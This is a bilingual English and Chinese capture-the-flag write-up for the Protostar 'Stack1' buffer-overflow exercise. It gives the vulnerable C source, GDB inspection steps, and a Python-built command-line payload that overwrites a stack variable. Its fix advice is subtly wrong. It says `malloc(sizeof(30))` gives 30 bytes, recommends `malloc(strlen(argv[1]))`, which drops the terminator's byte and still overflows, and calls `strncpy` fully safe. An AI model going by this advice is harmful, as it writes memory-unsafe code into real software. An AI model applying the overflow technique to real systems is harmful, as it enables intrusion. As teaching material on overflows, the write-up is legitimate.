# Stack1
## Source Code 源码
```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
    volatile int modified;
    char buffer[64];

    if(argc == 1) {
        errx(1, "please specify an argument\n");
    }

    modified = 0;
    strcpy(buffer, argv[1]);

    if(modified == 0x61626364) {
        printf("you have correctly got the variable to the right value\n");
    } else {
        printf("Try again, you got 0x%08x\n", modified);
    }
}
```
## Notes
This question is very similar to the previous question. We've already known that the function **gets()** has an overflow risk according to the previous question. **Stack1** is about the overflow risk of the function **strcpy()**.  
Following is the declaration for **strcpy()** function.  
`char *strcpy(char *dest, const char *src)`  
Since there is no indication of the number of characters to be copied, when the length of *src* exceeds the memory allocated to *dest*, the extra characters will overwrite the memory data at higher address, causing an overflow. In most cases, the programmer will use **strcpy()** function like this:  
```
char *dest = (char *)malloc(sizeof(30));
strcpy(dest, "Hello World!");
```
Here the size of *src* has been determined (size=13). Since it can never be greater than 30, there is no risk of overflow. However, the *src* of this question is *argv[1]*, which is the command line argument entered by the user. This is likely to occur the risk when the length of *src* is longer than the memory allocated to *dest*.  
Debugging with GDB:
`user@protostar:/opt/protostar/bin$ gdb -q stack1`  
`(gdb) set disassembly-flavor intel`  
`(gdb) disas main`  
![Main Assembly Code](https://github.com/HryMurph/Exploit-Exercise-Protostar/blob/master/Images/main-assembly1.png)  
According to the assembly code, the command line argument *argc* is stored in memory [ebp+0x8], and *argv[1]* is stored in memory [ebp+0xc+0x4]. Before calling **strcpy()**, the first argument *dest* is stored in memory [esp] and the second argument *src* is stored in memory [esp+0x4]. Draw a memory graph.  
![Stack1](https://github.com/HryMurph/Exploit-Exercise-Protostar/blob/master/Images/stack1.png)  
Set breakpoint on line 18: `b 18`  
Use 70 ‘a’ as the parameter for the first test: ```set args `ptyon -c "print 'a'*70"` ```  
Run the program: `r`  
The program stops at the breakpoint. Look at the data for the variables *buffer* and *modified*:  
![Buffer and Modified Memory](https://github.com/HryMurph/Exploit-Exercise-Protostar/blob/master/Images/memory1-1.png)  
As we can see, the value of *modified* becomes 0x61616161, which indicates that we have successfully performed an overflow attack. However, since the judgment statement of the program is `if(modified == 0x61626364)`, we have to modify the input string to: **64 ‘a’+“dcba”**. Because the memory uses the little endian mode to store and display data, the integer number 0x61626364 is actually stored in memory as 0x64, 0x63, 0x62, 0x61.  
![Buffer and Modified Memory](https://github.com/HryMurph/Exploit-Exercise-Protostar/blob/master/Images/memory1-2.png)  

To avoid the improper use of **strcpy()**, it is recommended to use another function **strncpy()**, which declaration is:  
`char *strncpy(char *dest, const char *src, size_t n)`  
Parameters:  
*dest* is the pointer to the destination array where the content is to be copied.  
*src* is the string to be copied.  
*n* is the number of characters to be copied from source.  
Return Value:  
This function returns the final copy of the copied string.  
The advantage of **strncpy()** is that the programmer can limit the value of the parameter *n* so that no overflow occurs regardless of how long the data is entered.

Another way to avoid overflow is to give enough memory directly when allocating memory to *dest*:  
`char *dest = (char *)malloc(strlen(argv[1]));`  
That means the size of the memory allocated to *dest* is as large as the size of *argv[1]*, which is the command line argument entered by users. This way can also improve memory utilization.  
## Solution
Simply add the correct parameter to the command line. This parameter can be simplified with Python's print statement.  
```
user@protostar:/opt/protostar/bin$ ./stack1 `python -c "print 'a'*64+'\x64\x63\x62\x61'"`
```
Result:  
![Solution](https://github.com/HryMurph/Exploit-Exercise-Protostar/blob/master/Images/result1.png)  
## 笔记 
本题与上题相似程度很高，上一题要让我们认识函数 **gets()** 的溢出风险，而本题则是函数 **strcpy()**。
**strcpy** 定义为：  
`char *strcpy(char *dest, const char *src)`  
由于没有指明要复制的字符数，因此当 *src* 的长度超过给 *dest* 分配的内存时，多余的字符便会覆盖更高地址的内存数据，造成溢出。大部分情况下，程序员会像这样来编写使用 **strcpy()**：  
```
char *dest = (char *)malloc(sizeof(30));
strcpy(dest, "Hello World!");
```  
这里 *src* 的大小已经确定下来（size=13），它永远不可能大于30，因此并不会有溢出的风险。而本题的 *src* 来源于 *argv[1]*，即用户自行输入的命令行参数，这就很有可能出现之前所说的 *src* 的长度超过给 *dest* 分配的内存的情况。  
使用GDB调试:  
`user@protostar:/opt/protostar/bin$ gdb -q stack1`  
`(gdb) set disassembly-flavor intel`  
`(gdb) disas main`  
![Main Assembly Code](https://github.com/HryMurph/Exploit-Exercise-Protostar/blob/master/Images/main-assembly1.png)  
从汇编代码分析得，命令行参数 *argc* 存于内存[ebp+0x8]处，*argv[1]* 存于内存[ebp+0xc+0x4]处。调用 **strcpy()** 之前，会将第一个参数 *dest* 存于内存[esp]处，而将第二个参数 *src* 存于内存[esp+0x4]处。绘出内存情况图。  
![Stack1](https://github.com/HryMurph/Exploit-Exercise-Protostar/blob/master/Images/stack1.png)  
在第18行下断点：`b 18`  
先使用字符串70个‘a’作为第一次测试的参数：```set args `ptyon -c "print 'a'*70"` ```  
运行程序：`r`  
程序停在断点处，查看变量 *buffer* 和 *modified* 的数据：  
![Buffer and Modified Memory](https://github.com/HryMurph/Exploit-Exercise-Protostar/blob/master/Images/memory1-1.png)  
可以看到，变量 *modified* 的值变为0x61616161，这表明我们成功进行了溢出攻击。但是由于程序的判断语句是`if(modified == 0x61626364)`，所以我们还要对输入的字符串作修改，改为： **64个‘a’+“dcba”**。因为内存是使用小端模式存储和显示数据的，因此整型数0x61626364在内存中实际表示为0x64、0x63、0x62、0x61。这样才能使得变量 *modified* 的值恰好被修改为0x61626364。  
![Buffer and Modified Memory](https://github.com/HryMurph/Exploit-Exercise-Protostar/blob/master/Images/memory1-2.png)  

想要避免不适当使用 **strcpy()** 导致的溢出问题，建议使用另一个函数 **strncpy()**，它定义为：  
`char *strncpy(char *dest, const char *src, size_t n)`  
参数：  
*dest* 为指向要复制内容的目标数组的指针。  
*src* 为指向要复制的源字符串的指针。  
*n* 为要从源字符串复制的字符数。  
返回值：  
返回最终复制的字符串。  
这种方法的好处是程序员可以限制参数 *n* 的值而使得无论输入的数据有多长都不会产生溢出。

另一个避免溢出的方法是在给 *dest* 分配内存的时候就直接给予足够大的内存：  
`char *dest = (char *)malloc(strlen(argv[1]));`  
即 *argv[1]* 的数据有多长，就分配多长的 *dest*。这样的分配内存方式还可以提高内存的利用率。  
## 结果
直接在命令行中加入正确触发溢出的参数即可，这个参数可用Python的print语句来简化实现。
```
user@protostar:/opt/protostar/bin$ ./stack1 `python -c "print 'a'*64+'\x64\x63\x62\x61'"`
```
结果：  
![Solution](https://github.com/HryMurph/Exploit-Exercise-Protostar/blob/master/Images/result1.png)
## Reference 参考
[tutorialspoint: C library function - strcpy()](https://www.tutorialspoint.com/c_standard_library/c_function_strcpy.htm)  
[CSDN: Suggestions of solving the function strcpy() overflow ( Author: zhongtianemail )( Language: Simplified Chinese )](https://blog.csdn.net/punk_lover/article/details/19824499)
[tutorialspoint: C library function - strncpy()](https://www.tutorialspoint.com/c_standard_library/c_function_strncpy.htm)